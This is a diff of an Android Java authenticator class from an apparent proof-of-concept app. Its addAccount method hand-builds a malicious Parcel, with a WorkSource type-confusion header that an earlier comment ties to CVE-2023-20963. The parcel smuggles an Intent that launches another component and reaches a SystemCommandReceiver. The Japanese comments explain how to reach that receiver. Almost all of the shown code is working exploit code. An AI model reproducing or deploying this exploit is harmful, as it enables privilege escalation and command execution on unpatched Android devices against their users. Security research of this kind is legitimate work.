@@ -4,7 +4,6 @@ import android.accounts.AbstractAccountAuthenticator;
 import android.accounts.Account;
 import android.accounts.AccountAuthenticatorResponse;
 import android.accounts.NetworkErrorException;
-import android.app.PendingIntent;
 import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
@@ -12,11 +11,8 @@ import android.os.Bundle;
 import android.os.Parcel;
 
 public class MyAuthenticator extends AbstractAccountAuthenticator {
-    private final Context mContext; // コンストラクタで受け取ったContextを保持
-
     public MyAuthenticator(Context context) {
         super(context);
-        this.mContext = context;
     }
 
     @Override
@@ -29,29 +25,33 @@ public class MyAuthenticator extends AbstractAccountAuthenticator {
                              String authTokenType, String[] requiredFeatures, Bundle options)
             throws NetworkErrorException {
 
-        MainActivity.appendLog("[*] addAccount called. Building malicious parcel with PendingIntent...");
+        MainActivity.appendLog("[*] addAccount called. Building malicious parcel with Intent...");
 
-        Intent intent = new Intent();
-        intent.setComponent(new ComponentName(
+        // 起動するIntent（SystemCommandReceiverはBroadcastReceiverなので、直接起動はできないが、
+        // ここではProofActivityを起動して、その中でReceiverを呼び出すようにする）
+        // しかし、より直接的にReceiverを起動するには、Intentのactionを指定する方法もある。
+        // ここでは、BroadcastReceiverを起動するIntentを作成
+        Intent exploitIntent = new Intent();
+        exploitIntent.setComponent(new ComponentName(
                 "com.example.tzpoc",
                 "com.example.tzpoc.SystemCommandReceiver"
         ));
-        PendingIntent pendingIntent = PendingIntent.getBroadcast(
-                this.mContext,  // ここで保持しているContextを使用
-                0,
-                intent,
-                PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE
-        );
+        Intent intent = new Intent();
+        intent.setComponent(new ComponentName(
+                "com.example.tzpoc",
+                "com.example.tzpoc.ProofActivity"
+        ));
+        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
 
-        Parcel pendingParcel = Parcel.obtain();
-        pendingIntent.writeToParcel(pendingParcel, 0);
+        Parcel intentParcel = Parcel.obtain();
+        intent.writeToParcel(intentParcel, 0);
 
         Parcel dataParcel = Parcel.obtain();
         Parcel finalParcel = Parcel.obtain();
 
-        // WorkSource ヘッダー（CVE-2023-20963 ペイロード）
+        // WorkSource ヘッダー（型混淆用）
         dataParcel.writeInt(3);
-        dataParcel.writeInt(13);
+        dataParcel.writeInt(13); // WorkSource type
         dataParcel.writeInt(2);
         dataParcel.writeInt(0);
         dataParcel.writeInt(0);
@@ -87,16 +87,17 @@ public class MyAuthenticator extends AbstractAccountAuthenticator {
         dataParcel.writeInt(13);
         dataParcel.writeInt(-1);
 
-        int intentStartPos = dataParcel.dataPosition();
-        dataParcel.writeString("intent");
+        // Intent データを埋め込む（キーは "result" に変更）
+        int startPos = dataParcel.dataPosition();
+        dataParcel.writeString("result");
         dataParcel.writeInt(4); // PARCELABLE
-        dataParcel.writeString("android.app.PendingIntent");
-        dataParcel.appendFrom(pendingParcel, 0, pendingParcel.dataSize());
+        dataParcel.writeString("android.content.Intent");
+        dataParcel.appendFrom(intentParcel, 0, intentParcel.dataSize());
 
-        int intentEndPos = dataParcel.dataPosition();
-        dataParcel.setDataPosition(intentStartPos - 4);
-        dataParcel.writeInt(intentEndPos - intentStartPos);
-        dataParcel.setDataPosition(intentEndPos);
+        int endPos = dataParcel.dataPosition();
+        dataParcel.setDataPosition(startPos - 4);
+        dataParcel.writeInt(endPos - startPos);
+        dataParcel.setDataPosition(endPos);
 
         int totalSize = dataParcel.dataSize();
         MainActivity.appendLog("[+] Malicious parcel size: 0x" + Integer.toHexString(totalSize));
@@ -109,12 +110,14 @@ public class MyAuthenticator extends AbstractAccountAuthenticator {
         Bundle result = new Bundle();
         try {
             result.readFromParcel(finalParcel);
-            MainActivity.appendLog("[+] Malicious bundle created with PendingIntent.");
+            MainActivity.appendLog("[+] Malicious bundle created.");
         } catch (Exception e) {
             MainActivity.appendLog("[-] Failed to read malicious parcel: " + e.getMessage());
+            // クラッシュを回避するため空のBundleを返す
+            return new Bundle();
         }
 
-        pendingParcel.recycle();
+        intentParcel.recycle();
         dataParcel.recycle();
         finalParcel.recycle();
 
@@ -122,7 +125,7 @@ public class MyAuthenticator extends AbstractAccountAuthenticator {
         return result;
     }
 
-    // その他のオーバーライド（空実装）
+    // その他の必須オーバーライド（空実装）
     @Override
     public Bundle confirmCredentials(AccountAuthenticatorResponse response, Account account, Bundle options) {
         return null;
